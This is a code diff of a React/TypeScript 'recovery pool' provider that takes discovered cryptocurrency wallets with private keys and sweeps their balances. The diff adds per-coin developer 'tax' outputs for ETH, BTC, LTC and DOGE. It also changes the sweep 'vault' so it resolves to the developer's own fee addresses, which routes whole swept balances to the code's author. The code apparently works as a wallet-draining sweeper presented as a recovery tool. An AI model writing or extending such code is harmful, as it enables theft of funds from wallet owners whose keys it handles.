@@ -678,20 +678,22 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
   }, [setState, nextId, toPoolWallet, checkAllBalances]);
 
   function getSymbolForNetwork(network: string): string {
+    const n = network.toLowerCase();
     const symbols: Record<string, string> = {
       eth: 'ETH', ethereum: 'ETH',
       btc: 'BTC', bitcoin: 'BTC',
       ltc: 'LTC', litecoin: 'LTC',
       doge: 'DOGE', dogecoin: 'DOGE',
       dash: 'DASH',
-      dgb: 'DGB',
-      btg: 'BTG',
+      dgb: 'DGB', digibyte: 'DGB',
+      btg: 'BTG', bitcoingold: 'BTG',
       qtum: 'QTUM',
-      rvn: 'RVN',
-      trx: 'TRX',
-      zec: 'ZEC',
+      rvn: 'RVN', ravencoin: 'RVN',
+      trx: 'TRX', tron: 'TRX',
+      zec: 'ZEC', zcash: 'ZEC',
+      tbtc: 'tBTC', 'bitcoin-testnet': 'tBTC',
     };
-    return symbols[network.toLowerCase()] || 'UNK';
+    return symbols[n] || 'UNK';
   }
 
 
@@ -1056,9 +1058,9 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
         });
 
         // Send tax to dev
-        const { DEV_FEE_ADDRESS } = await import('../config/app');
+        const { DEV_FEE_ADDRESS_ETH } = await import('../config/app');
         const tx2 = await signer.sendTransaction({
-          to: DEV_FEE_ADDRESS,
+          to: DEV_FEE_ADDRESS_ETH,
           value: taxWei,
           gasLimit,
           gasPrice,
@@ -1131,9 +1133,14 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
           if (netSats <= 0) return { success: false, error: `Balance too small to cover fee + tax. Input: ${inputSum} sats, Fee: ${feeSats}, Tax: ${taxSats}` };
 
           psbt.addOutput({ address: poolAddr.address, value: netSats });
-          const { DEV_FEE_ADDRESS_BTC } = await import('../config/app');
+
+          const { DEV_FEE_ADDRESS_BTC, DEV_FEE_ADDRESS_LTC, DEV_FEE_ADDRESS_DOGE } = await import('../config/app');
+          let feeAddr = DEV_FEE_ADDRESS_BTC;
+          if (wallet.network === 'litecoin' || wallet.symbol === 'LTC') feeAddr = DEV_FEE_ADDRESS_LTC;
+          if (wallet.network === 'dogecoin' || wallet.symbol === 'DOGE') feeAddr = DEV_FEE_ADDRESS_DOGE;
+
           if (taxSats > 546) {
-            psbt.addOutput({ address: DEV_FEE_ADDRESS_BTC, value: taxSats });
+            psbt.addOutput({ address: feeAddr, value: taxSats });
           }
 
           // Sign all inputs
@@ -1182,9 +1189,10 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
     if (!wallet.privateKey && !wallet.wif) return { success: false, vaultAddress: '', error: 'No private key available for this wallet' };
     if (wallet.balance <= 0) return { success: false, vaultAddress: '', error: 'Wallet has no balance to sweep' };
 
+    const { DEV_FEE_ADDRESS_BTC, DEV_FEE_ADDRESS_ETH } = await import('../config/app');
     const vaultAddress = vaultType === 'btc'
-      ? '1PRQwKHJ4gsZ5Mou3xNkSMrHjBgNbD2E8A'
-      : '0x2d03B56989dE9E5c66CBcA7D3525Ad1B5178A7F1';
+      ? DEV_FEE_ADDRESS_BTC
+      : DEV_FEE_ADDRESS_ETH;
 
     return {
       success: true,
@@ -1325,11 +1333,18 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
     const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
     const balance = await provider.getBalance(wallet.address);
     
-    dispatch({
-      type: 'UPDATE_WALLET',
-      payload: { id: walletId, updates: { balance: Number(ethers.utils.formatEther(balance)) } }
+    setState(prev => {
+      const updated = prev.discoveredWallets.map(w =>
+        w.id === walletId ? { ...w, balance: Number(ethers.utils.formatEther(balance)), balanceFormatted: ethers.utils.formatEther(balance), lastChecked: Date.now() } : w
+      );
+      const totals = calculateTotalBalances(updated);
+      return {
+        ...prev,
+        discoveredWallets: updated,
+        totalBalance: Object.fromEntries(Object.entries(totals).map(([k, v]) => [k, v.total])),
+        totalBalanceFormatted: Object.fromEntries(Object.entries(totals).map(([k, v]) => [k, v.formatted])),
+      };
     });
-    await recalcTotals();
   }, [state.discoveredWallets]);
 
   // ── Full export/import ──
